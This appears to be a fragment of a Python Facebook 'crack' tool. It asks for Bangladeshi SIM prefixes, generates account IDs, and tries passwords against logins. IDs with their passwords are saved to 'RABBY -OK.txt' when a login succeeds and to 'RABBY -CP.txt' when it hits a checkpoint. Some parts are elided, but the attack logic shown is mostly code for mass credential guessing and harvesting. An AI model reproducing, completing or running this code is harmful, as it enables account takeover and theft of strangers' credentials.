...
def Herry():
    ...
    if Herryx =='5':
        exit()
    if Herryx =='3':
        os.system('xdg-open https://github.com/rabb6770?tab=projects ')
    if Herryx =='4':
        os.system('xdg-open https://www.facebook.com/rabbi.nai10');Herry()
    if Herryx =='2':
        bangla()
    else:
...
def bangla():
    os.system('clear')
    print(logo)
    print('[1] Bangla Crack \x1b[1;92mM 1')
    print('\x1b[1;97m[1] Bangla Crack \x1b[1;92mM 1')
...
def b1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 88017,88019,88018,88016Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[RABBY -OK] '+cid+'|'+ps+'\033[0;97m')
                open('RABBY -OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[RABBY -CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('RABBY -CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
